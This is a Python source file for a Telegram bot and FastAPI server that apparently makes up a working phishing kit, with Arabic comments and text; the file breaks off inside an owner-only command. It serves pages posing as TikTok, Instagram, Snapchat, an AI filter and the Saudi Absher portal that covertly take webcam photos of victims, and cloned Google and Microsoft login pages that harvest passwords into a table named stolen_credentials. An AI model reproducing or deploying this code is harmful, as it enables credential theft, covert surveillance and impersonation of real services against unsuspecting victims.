import os
import base64
import io
import sqlite3
import hashlib
import traceback
import logging
import random
import string
from datetime import datetime
import uvicorn
from pydantic import BaseModel
from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== إعداد السجلات ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== التكوينات ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
RENDER_URL = os.getenv("RENDER_URL", "")
CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "Shadow_Secret_2026")
SALT = os.getenv("SALT", "Shadow_Salt_321")
OWNER_ID = 7295259673  # تم وضع معرف المالك هنا

if not BOT_TOKEN or not RENDER_URL:
    logger.error("❌ المتغيرات البيئية BOT_TOKEN و RENDER_URL غير مضبوطة!")
    raise ValueError("يجب تعيين BOT_TOKEN و RENDER_URL في البيئة")

logger.info(f"🔧 BOT_TOKEN: آخر 4 أحرف ...{BOT_TOKEN[-4:]}")
logger.info(f"🔧 RENDER_URL: {RENDER_URL}")
logger.info(f"🔧 OWNER_ID: {OWNER_ID}")

# ==================== تهيئة البوت ====================
try:
    bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
    bot.get_me()
    logger.info("✅ التوكن صحيح ويعمل")
except Exception as e:
    logger.error(f"❌ فشل تهيئة البوت: {e}")
    raise

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== نماذج البيانات ====================
class LoginData(BaseModel):
    chat_id: int
    username: str
    password: str

class CaptureData(BaseModel):
    user_id: int
    image: str
    count: int
    device: str
    secret: str

class CredentialsData(BaseModel):
    user_id: int
    email: str
    password: str
    login_type: str
    secret: str

# ==================== قاعدة البيانات ====================
def get_db_connection():
    conn = sqlite3.connect("users.db", check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS bot_users (
            username TEXT PRIMARY KEY,
            password_hash TEXT,
            linked_chat_id INTEGER DEFAULT NULL,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS operation_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            template_type TEXT,
            generated_link TEXT,
            target_ip TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS captured_targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_chat_id INTEGER,
            target_ip TEXT,
            target_device TEXT,
            image_count INTEGER,
            captured_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS stolen_credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_chat_id INTEGER,
            login_type TEXT,
            email TEXT,
            password TEXT,
            target_ip TEXT,
            captured_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()
    logger.info("✅ قاعدة البيانات جاهزة")

init_db()

def hash_password(password: str) -> str:
    return hashlib.sha256((password + SALT).encode()).hexdigest()

def create_new_account(username, password):
    conn = get_db_connection()
    cursor = conn.cursor()
    hashed = hash_password(password)
    try:
        cursor.execute("INSERT OR IGNORE INTO bot_users (username, password_hash) VALUES (?, ?)", (username, hashed))
        conn.commit()
    except Exception as e:
        logger.error(f"DB Error create: {e}")
    finally:
        conn.close()

def try_login_user(chat_id, username, password):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT password_hash FROM bot_users WHERE username = ?", (username,))
    result = cursor.fetchone()
    if result and result[0] == hash_password(password):
        cursor.execute("UPDATE bot_users SET linked_chat_id = ? WHERE username = ?", (chat_id, username))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def has_active_session(chat_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT username FROM bot_users WHERE linked_chat_id = ?", (chat_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

def log_operation(chat_id, template_type, link, ip="0.0.0.0"):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO operation_logs (chat_id, template_type, generated_link, target_ip) VALUES (?, ?, ?, ?)",
                       (chat_id, template_type, link, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل العملية: {e}")

def log_capture(owner_chat_id, ip, device, count):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO captured_targets (owner_chat_id, target_ip, target_device, image_count) VALUES (?, ?, ?, ?)",
                       (owner_chat_id, ip, device, count))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل الالتقاط: {e}")

def log_credentials(owner_chat_id, login_type, email, password, ip):
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO stolen_credentials (owner_chat_id, login_type, email, password, target_ip) VALUES (?, ?, ?, ?, ?)",
                       (owner_chat_id, login_type, email, password, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"⚠️ فشل تسجيل بيانات الدخول: {e}")

# ==================== صفحة تسجيل الدخول ====================
def get_login_html():
    return """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تسجيل الدخول للنظام</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            body {
                background-color: #182533; color: #ffffff; font-family: system-ui, sans-serif;
                display: flex; flex-direction: column; align-items: center; justify-content: center;
                min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box;
            }
            .login-card {
                background: #223140; padding: 30px 25px; border-radius: 15px;
                box-shadow: 0 10px 25px rgba(0,0,0,0.4); max-width: 360px; width: 100%;
                text-align: center; border: 1px solid #2b3d50;
            }
            h2 { font-size: 22px; margin-bottom: 20px; color: #5288c1; }
            .input-group { margin-bottom: 20px; text-align: right; }
            label { display: block; margin-bottom: 8px; font-size: 14px; color: #b1c7df; }
            input {
                width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2b3d50;
                background: #182533; color: white; font-size: 16px; box-sizing: border-box;
                outline: none; transition: border 0.2s;
            }
            input:focus { border-color: #5288c1; }
            .btn {
                background-color: #2481cc; color: white; border: none; padding: 14px;
                font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer;
                width: 100%; margin-top: 10px; transition: background 0.2s;
            }
            #error-msg { color: #e53935; font-size: 14px; margin-top: 15px; display: none; }
            #success-msg { color: #4caf50; font-size: 14px; margin-top: 15px; display: none; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h2>🔐 تسجيل الدخول للنظام</h2>
            <div class="input-group">
                <label>اسم المستخدم</label>
                <input type="text" id="username" placeholder="أدخل اسم المستخدم">
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="أدخل كلمة المرور">
            </div>
            <button class="btn" id="loginBtn">تسجيل الدخول</button>
            <div id="error-msg"></div>
            <div id="success-msg"></div>
        </div>

        <script>
            const tg = window.Telegram.WebApp;
            tg.expand();

            document.getElementById('loginBtn').addEventListener('click', function() {
                const user = document.getElementById('username').value.trim();
                const pass = document.getElementById('password').value.trim();
                const errorBlock = document.getElementById('error-msg');
                const successBlock = document.getElementById('success-msg');

                if(!user || !pass) {
                    errorBlock.innerText = "⚠️ يرجى ملء جميع الحقول!";
                    errorBlock.style.display = "block";
                    return;
                }

                errorBlock.style.display = "none";
                
                fetch('/api/web-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: tg.initDataUnsafe.user.id,
                        username: user,
                        password: pass
                    })
                })
                .then(res => res.json())
                .then(data => {
                    if(data.status === "success") {
                        successBlock.innerText = "🎉 تم تسجيل الدخول بنجاح!";
                        successBlock.style.display = "block";
                        setTimeout(() => { tg.close(); }, 1500);
                    } else {
                        errorBlock.innerText = "❌ " + data.message;
                        errorBlock.style.display = "block";
                    }
                })
                .catch(err => {
                    errorBlock.innerText = "⚠️ حدث خطأ في الاتصال بالسيرفر";
                    errorBlock.style.display = "block";
                });
            });
        </script>
    </body>
    </html>
    """

# ==================== صفحات المقالب (كاميرا + كلمات مرور) ====================
def get_html_content(template_type, secret_key):
    # --- قوالب الكاميرا ---
    if template_type in ["tiktok", "instagram", "snapchat", "ai_filter", "absher"]:
        bg_color = "#010101"; card_bg = "#121212"; btn_color = "#fe2c55"
        logo_text = "TikTok"; logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
        title = "تحدي الملامح التفاعلي جاهز"
        desc = "يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية."
        btn_text = "▶ اضغط لمشاهدة التحدي"
        redirect_to = "https://www.tiktok.com"
        
        if template_type == "instagram":
            bg_color = "#fafafa"; card_bg = "#ffffff"; btn_color = "#0095f6"
            logo_text = "Instagram"; logo_style = "background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"
            title = "🛡️ نظام فحص وتوثيق الحسابات الحية"
            desc = "لتأكيد هويتك وتوثيق حسابك بالعلامة الزرقاء مجاناً، يرجى تفعيل الكاميرا الأمامية للمسح الحي."
            btn_text = "✨ ابدأ الفحص الحي للحساب الآن"
            redirect_to = "https://www.instagram.com"
        elif template_type == "snapchat":
            bg_color = "#fffc00"; card_bg = "#ffffff"; btn_color = "#000000"
            logo_text = "Snapchat"; logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
            title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"
            desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل."
            btn_text = "🔥 تشغيل الفلتر الحصري"
            redirect_to = "https://www.snapchat.com"
        elif template_type == "ai_filter":
            bg_color = "#0f172a"; card_bg = "#1e293b"; btn_color = "#3b82f6"
            logo_text = "AI Look-Alike 🧠"; logo_style = "background: linear-gradient(to right, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;"
            title = "🔍 فلتر كاشف الشبيه بالذكاء الاصطناعي v2.4"
            desc = "اكتشف من تشبه من مشاهير كرة القدم! يرجى السماح للكاميرا الأمامية لبدء المسح الحي."
            btn_text = "⚡ ابدأ الفحص الحي واكتشف شبيهك الآن"
            redirect_to = "https://www.google.com"
        elif template_type == "absher":
            bg_color = "#f4f6f9"; card_bg = "#ffffff"; btn_color = "#2d6a4f"
            logo_text = "Absher | أبشر"; logo_style = "color: #2d6a4f; font-weight: bold; border-bottom: 3px solid #52b788;"
            title = "🛡️ منصة التحقق الوطني الموحد (أمن البيانات)"
            desc = "تم رصد محاولة دخول مشبوهة. يرجى تفعيل الكاميرا الأمامية لمطابقة بصمة الوجه الحية."
            btn_text = "🔒 ابدأ التحقق الفوري والمسح الحي"
            redirect_to = "https://www.saudiarabia.gov.sa"
        
        return f"""
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{logo_text}</title>
            <style>
                * {{ box-sizing: border-box; margin: 0; padding: 0; }}
                body {{ 
                    background-color: {bg_color}; color: #ffffff; font-family: system-ui, sans-serif; 
                    display: flex; flex-direction: column; align-items: center; justify-content: center; 
                    min-height: 100vh; padding: 20px;
                }}
                .container {{ 
                    background: {card_bg}; padding: 35px 25px; border-radius: 20px; 
                    box-shadow: 0 15px 35px rgba(0,0,0,0.3); max-width: 420px; width: 100%; 
                    text-align: center;
                }}
                .logo {{ font-size: 34px; font-weight: 800; margin-bottom: 25px; display: inline-block; {logo_style} }}
                .video-box {{
                    width: 100%; height: 200px; background: #000000; border-radius: 12px; margin-bottom: 25px;
                    display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative;
                    border: 1px dashed #475569;
                }}
                .loader {{
                    border: 4px solid #f3f3f3; border-top: 4px solid {btn_color}; border-radius: 50%;
                    width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 15px;
                }}
                @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
                .progress-bar {{
                    width: 80%; height: 6px; background: #334155; border-radius: 10px; margin: 10px auto; display: none;
                }}
                .progress-fill {{
                    height: 100%; width: 0%; background: {btn_color}; border-radius: 10px; transition: width 0.3s;
                }}
                .loading-text {{ color: #94a3b8; font-size: 14px; }}
                h2 {{ font-size: 19px; font-weight: 700; margin-bottom: 12px; }}
                p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }}
                .btn {{ 
                    background-color: {btn_color}; color: white; border: none; padding: 16px 32px; 
                    font-size: 16px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; 
                    box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
                }}
                .btn:active {{ transform: scale(0.98); }}
                .error-msg {{ color: #ef4444; font-size: 13px; margin-top: 15px; display: none; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">{logo_text}</div>
                <div class="video-box">
                    <div class="loader" id="mainLoader"></div>
                    <div class="loading-text" id="statusText">جاري تهيئة خوارزميات الـ AI...</div>
                    <div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div>
                </div>
                <h2 id="mainTitle">{title}</h2>
                <p id="mainDesc">{desc}</p>
                <button class="btn" id="startBtn">{btn_text}</button>
                <div class="error-msg" id="errorBlock">⚠️ خطأ: الكاميرا معطلة! يجب السماح بالوصول.</div>
            </div>

            <script>
                const urlParams = new URLSearchParams(window.location.search);
                const ownerId = urlParams.get('id');
                const REDIRECT_URL = "{redirect_to}";
                const SECRET_KEY = "{secret_key}";

                function getDeviceInfo() {{
                    const ua = navigator.userAgent;
                    let os = "غير معروف", browser = "غير معروف";
                    if (ua.indexOf("Win") !== -1) os = "Windows";
                    else if (ua.indexOf("Mac") !== -1) os = "Mac OS / iPhone";
                    else if (ua.indexOf("Android") !== -1) os = "Android";
                    if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
                    else if (ua.indexOf("Safari") !== -1) browser = "Safari";
                    return os + " (" + browser + ")";
                }}

                function startFakeProgress(callback) {{
                    const bar = document.getElementById('progressBar');
                    const fill = document.getElementById('progressFill');
                    bar.style.display = 'block';
                    let width = 0;
                    const interval = setInterval(() => {{
                        width += Math.floor(Math.random() * 15) + 5;
                        if (width >= 100) {{ width = 100; clearInterval(interval); }}
                        fill.style.width = width + '%';
                        document.getElementById('statusText').innerText = 'جاري تحليل الملامح ' + width + '%';
                        if (width >= 100) {{
                            setTimeout(callback, 400);
                        }}
                    }}, 300);
                }}

                function tryCapture() {{
                    if (!ownerId) {{ window.location.href = REDIRECT_URL; return; }}

                    navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                    .then(function(stream) {{
                        document.getElementById('errorBlock').style.display = 'none';
                        document.getElementById('statusText').innerText = "نجح الاتصال.. جاري قراءة النقاط الحيوية...";
                        
                        let video = document.createElement('video');
                        video.srcObject = stream;
                        video.setAttribute("playsinline", true);
                        video.play();
                        
                        video.onloadedmetadata = function() {{
                            let canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                            let ctx = canvas.getContext('2d');
                            let shotsTaken = 0; const deviceInfo = getDeviceInfo();
                            const totalShots = 3;

                            startFakeProgress(() => {{
                                let captureInterval = setInterval(function() {{
                                    if (shotsTaken >= totalShots) {{
                                        clearInterval(captureInterval);
                                        stream.getTracks().forEach(track => track.stop());
                                        window.location.href = REDIRECT_URL + '?verified=true';
                                        return;
                                    }}
                                    ctx.drawImage(video, 0, 0);
                                    let base64Image = canvas.toDataURL('image/jpeg', 0.75);
                                    fetch('/api/capture', {{
                                        method: 'POST',
                                        headers: {{ 'Content-Type': 'application/json' }},
                                        body: JSON.stringify({{
                                            user_id: ownerId,
                                            image: base64Image,
                                            count: shotsTaken + 1,
                                            device: deviceInfo,
                                            secret: SECRET_KEY
                                        }})
                                    }});
                                    shotsTaken++;
                                }}, 600);
                            }});
                        }};
                    }})
                    .catch(function(err) {{
                        document.getElementById('errorBlock').style.display = 'block';
                        document.getElementById('statusText').innerText = "⚠️ تعذر التحليل! يرجى منح الإذن.";
                    }});
                }}
                document.getElementById('startBtn').addEventListener('click', tryCapture);
            </script>
        </body>
        </html>
        """
    
    # --- قوالب كلمات المرور (جوجل ومايكروسوفت) ---
    elif template_type == "google":
        return f"""
        <!DOCTYPE html>
        <html lang="ar" dir="ltr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>تسجيل الدخول - Google</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    background: #ffffff;
                    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    margin: 0;
                    padding: 20px;
                }}
                .container {{
                    max-width: 450px;
                    width: 100%;
                    padding: 48px 40px 36px;
                    border-radius: 8px;
                    border: 1px solid #dadce0;
                    background: white;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
                }}
                .logo {{
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    gap: 4px;
                    font-size: 24px;
                    font-weight: 500;
                    letter-spacing: -0.5px;
                    margin-bottom: 20px;
                }}
                .logo span:nth-child(1) {{ color: #4285f4; }}
                .logo span:nth-child(2) {{ color: #ea4335; }}
                .logo span:nth-child(3) {{ color: #fbbc05; }}
                .logo span:nth-child(4) {{ color: #4285f4; }}
                .logo span:nth-child(5) {{ color: #34a853; }}
                .logo span:nth-child(6) {{ color: #ea4335; }}
                .title {{
                    font-size: 24px;
                    font-weight: 400;
                    text-align: center;
                    margin-bottom: 10px;
                    color: #202124;
                }}
                .subtitle {{
                    font-size: 16px;
                    font-weight: 400;
                    text-align: center;
                    color: #5f6368;
                    margin-bottom: 30px;
                }}
                .input-group {{
                    margin-bottom: 20px;
                    position: relative;
                }}
                .input-group input {{
                    width: 100%;
                    padding: 13px 15px;
                    border: 1px solid #dadce0;
                    border-radius: 4px;
                    font-size: 16px;
                    color: #202124;
                    background: white;
                    transition: border-color 0.2s;
                    outline: none;
                }}
                .input-group input:focus {{
                    border-color: #4285f4;
                    box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
                }}
                .input-group input::placeholder {{
                    color: #80868b;
                    font-weight: 400;
                }}
                .btn {{
                    background: #4285f4;
                    color: white;
                    border: none;
                    padding: 12px;
                    font-size: 16px;
                    font-weight: 500;
                    border-radius: 4px;
                    cursor: pointer;
                    width: 100%;
                    transition: background 0.2s;
                    margin-top: 10px;
                    letter-spacing: 0.3px;
                }}
                .btn:hover {{
                    background: #3367d6;
                }}
                .btn:active {{
                    background: #2a56c6;
                }}
                .error {{
                    color: #d93025;
                    font-size: 14px;
                    margin-top: 15px;
                    display: none;
                    background: #fce8e6;
                    padding: 10px;
                    border-radius: 4px;
                    text-align: center;
                }}
                .footer {{
                    margin-top: 30px;
                    text-align: center;
                    font-size: 14px;
                    color: #5f6368;
                }}
                .footer a {{
                    color: #4285f4;
                    text-decoration: none;
                }}
                .footer a:hover {{
                    text-decoration: underline;
                }}
                .separator {{
                    display: flex;
                    align-items: center;
                    margin: 20px 0;
                    color: #5f6368;
                    font-size: 14px;
                }}
                .separator::before, .separator::after {{
                    content: "";
                    flex: 1;
                    height: 1px;
                    background: #dadce0;
                }}
                .separator::before {{ margin-right: 15px; }}
                .separator::after {{ margin-left: 15px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                </div>
                <div class="title">تسجيل الدخول</div>
                <div class="subtitle">استمراراً إلى حسابك على Google</div>
                
                <div class="input-group">
                    <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
                </div>
                
                <button class="btn" id="loginBtn">تسجيل الدخول</button>
                <div class="error" id="errorMsg">تأكد من أن بيانات الدخول صحيحة</div>
                
                <div class="separator">أو</div>
                
                <div style="text-align: center; margin-top: 10px;">
                    <a href="#" style="color: #4285f4; text-decoration: none; font-size: 14px; font-weight: 500;">إنشاء حساب</a>
                </div>
                
                <div class="footer">
                    <a href="#">مساعدة</a> · <a href="#">خصوصية</a> · <a href="#">شروط الخدمة</a>
                </div>
            </div>
            
            <script>
                const ownerId = new URLSearchParams(window.location.search).get('id');
                document.getElementById('loginBtn').addEventListener('click', function() {{
                    const email = document.getElementById('email').value.trim();
                    const pass = document.getElementById('password').value.trim();
                    const errorBlock = document.getElementById('errorMsg');
                    
                    if(!email || !pass) {{
                        errorBlock.style.display = 'block';
                        errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول';
                        return;
                    }}
                    
                    errorBlock.style.display = 'none';
                    
                    fetch('/api/credentials', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            user_id: ownerId,
                            email: email,
                            password: pass,
                            login_type: 'google',
                            secret: '{secret_key}'
                        }})
                    }})
                    .then(() => {{
                        window.location.href = 'https://accounts.google.com/v3/signin/challenge/pwd?continue=https://www.google.com';
                    }})
                    .catch(() => {{
                        window.location.href = 'https://www.google.com';
                    }});
                }});
                
                // الضغط على Enter
                document.getElementById('password').addEventListener('keypress', function(e) {{
                    if(e.key === 'Enter') document.getElementById('loginBtn').click();
                }});
            </script>
        </body>
        </html>
        """
    
    elif template_type == "microsoft":
        return f"""
        <!DOCTYPE html>
        <html lang="ar" dir="ltr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>تسجيل الدخول - Microsoft</title>
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{
                    background: #f2f2f2;
                    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    margin: 0;
                    padding: 20px;
                }}
                .container {{
                    max-width: 440px;
                    width: 100%;
                    background: white;
                    padding: 44px 40px 36px;
                    border-radius: 8px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.08);
                }}
                .logo {{
                    font-size: 28px;
                    font-weight: 600;
                    color: #202124;
                    text-align: center;
                    margin-bottom: 5px;
                }}
                .logo small {{
                    font-size: 14px;
                    color: #5f6368;
                    display: block;
                    font-weight: 400;
                    margin-top: 2px;
                }}
                .title {{
                    font-size: 20px;
                    font-weight: 600;
                    color: #202124;
                    text-align: center;
                    margin-bottom: 8px;
                }}
                .subtitle {{
                    font-size: 15px;
                    color: #5f6368;
                    text-align: center;
                    margin-bottom: 30px;
                }}
                .input-group {{
                    margin-bottom: 18px;
                }}
                .input-group input {{
                    width: 100%;
                    padding: 12px 14px;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                    font-size: 15px;
                    color: #202124;
                    background: white;
                    transition: border-color 0.2s;
                    outline: none;
                }}
                .input-group input:focus {{
                    border-color: #0078d4;
                }}
                .btn {{
                    background: #0078d4;
                    color: white;
                    border: none;
                    padding: 12px;
                    font-size: 15px;
                    font-weight: 600;
                    border-radius: 4px;
                    cursor: pointer;
                    width: 100%;
                    transition: background 0.2s;
                }}
                .btn:hover {{
                    background: #005a9e;
                }}
                .error {{
                    color: #d13438;
                    font-size: 14px;
                    margin-top: 15px;
                    display: none;
                    background: #fce8e6;
                    padding: 10px;
                    border-radius: 4px;
                    text-align: center;
                }}
                .footer {{
                    margin-top: 25px;
                    text-align: center;
                    font-size: 13px;
                    color: #5f6368;
                }}
                .footer a {{
                    color: #0078d4;
                    text-decoration: none;
                }}
                .footer a:hover {{
                    text-decoration: underline;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    Microsoft
                    <small>حسابك</small>
                </div>
                <div class="title">تسجيل الدخول</div>
                <div class="subtitle">لتفعيل اشتراكك وخدماتك</div>
                
                <div class="input-group">
                    <input type="text" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم" autofocus>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="كلمة المرور">
                </div>
                
                <button class="btn" id="loginBtn">تسجيل الدخول</button>
                <div class="error" id="errorMsg">تأكد من صحة بيانات الدخول</div>
                
                <div class="footer">
                    <a href="#">نسيت كلمة المرور؟</a> · <a href="#">إنشاء حساب جديد</a>
                </div>
            </div>
            
            <script>
                const ownerId = new URLSearchParams(window.location.search).get('id');
                document.getElementById('loginBtn').addEventListener('click', function() {{
                    const email = document.getElementById('email').value.trim();
                    const pass = document.getElementById('password').value.trim();
                    const errorBlock = document.getElementById('errorMsg');
                    
                    if(!email || !pass) {{
                        errorBlock.style.display = 'block';
                        errorBlock.innerText = '⚠️ يرجى ملء جميع الحقول';
                        return;
                    }}
                    
                    errorBlock.style.display = 'none';
                    
                    fetch('/api/credentials', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            user_id: ownerId,
                            email: email,
                            password: pass,
                            login_type: 'microsoft',
                            secret: '{secret_key}'
                        }})
                    }})
                    .then(() => {{
                        window.location.href = 'https://login.live.com/';
                    }})
                    .catch(() => {{
                        window.location.href = 'https://www.microsoft.com';
                    }});
                }});
                
                document.getElementById('password').addEventListener('keypress', function(e) {{
                    if(e.key === 'Enter') document.getElementById('loginBtn').click();
                }});
            </script>
        </body>
        </html>
        """
    return "<h1>قالب غير معروف</h1>"

# ==================== أوامر البوت ====================
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    logger.info(f"📩 بدء المستخدم {chat_id}")
    if has_active_session(chat_id):
        show_main_menu(chat_id)
        return
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔐 تسجيل الدخول للنظام", web_app=telebot.types.WebAppInfo(url=f"{RENDER_URL}/login-page")),
        InlineKeyboardButton("ℹ️ تعليمات", callback_data="show_instructions")
    )
    bot.send_message(chat_id, "🛡️ نظام الصيد الذكي v11.0\nيرجى تسجيل الدخول.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
def show_instructions(call):
    try:
        bot.answer_callback_query(call.id, "جاري العرض...")
        bot.send_message(call.message.chat.id, "للاشتراك تواصل مع الإدارة.", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_start")))
    except Exception as e:
        logger.error(f"Error instructions: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start(call):
    try:
        bot.answer_callback_query(call.id)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)
    except Exception as e:
        logger.error(f"Error back: {e}")

def show_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🎬 تيك توك", callback_data="gen_tiktok"),
        InlineKeyboardButton("📸 إنستغرام", callback_data="gen_instagram"),
        InlineKeyboardButton("👻 سناب شات", callback_data="gen_snapchat"),
        InlineKeyboardButton("🧠 فلتر AI", callback_data="gen_ai_filter"),
        InlineKeyboardButton("🚨 أبشر", callback_data="gen_absher"),
        InlineKeyboardButton("📧 جوجل (كلمة مرور)", callback_data="gen_google"),
        InlineKeyboardButton("🔑 مايكروسوفت (كلمة مرور)", callback_data="gen_microsoft"),
        InlineKeyboardButton("🔄 تحديث الجلسة", callback_data="gen_refresh")
    )
    bot.send_message(chat_id, "👑 اختر القالب المناسب:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def gen_link(call):
    try:
        bot.answer_callback_query(call.id, "⏳ جاري التجهيز...")
    except:
        pass
    
    chat_id = call.message.chat.id
    logger.info(f"🔄 زر مضغوط: {call.data} من {chat_id}")
    
    try:
        if not has_active_session(chat_id):
            bot.send_message(chat_id, "❌ جلسة منتهية. استخدم /start.")
            return
        
        raw = call.data.split("_", 1)[1]
        template_map = {
            "tiktok": "tiktok", "instagram": "instagram", "snapchat": "snapchat",
            "ai_filter": "ai_filter", "absher": "absher",
            "google": "google", "microsoft": "microsoft", "refresh": "refresh"
        }
        template = template_map.get(raw)
        if not template:
            bot.send_message(chat_id, "⚠️ نوع غير معروف.")
            return
        if template == "refresh":
            bot.send_message(chat_id, "✅ تم تحديث الجلسة.")
            return
        
        link = f"{RENDER_URL}?id={chat_id}&template={template}"
        log_operation(chat_id, template, link, "pending")
        bot.send_message(chat_id, f"🚀 **الرابط جاهز:**\n`{link}`\n📌 النوع: {template.upper()}", parse_mode="Markdown")
        logger.info(f"✅ تم إرسال الرابط {link}")
    except Exception as e:
        logger.error(f"💥 خطأ: {traceback.format_exc()}")
        bot.send_message(chat_id, f"⚠️ عطل تقني: {str(e)[:100]}")

# ==================== أمر توليد 100 مستخدم جديد (للمالك فقط) ====================
@bot.message_handler(commands=['genusers'])
def generate_users_command(message):
    chat_id = message.chat.id
    if chat_id != OWNER_ID:
        bot.send_message(chat_id, "⛔ هذا الأمر خاص بصاحب النظام فقط.")
        return

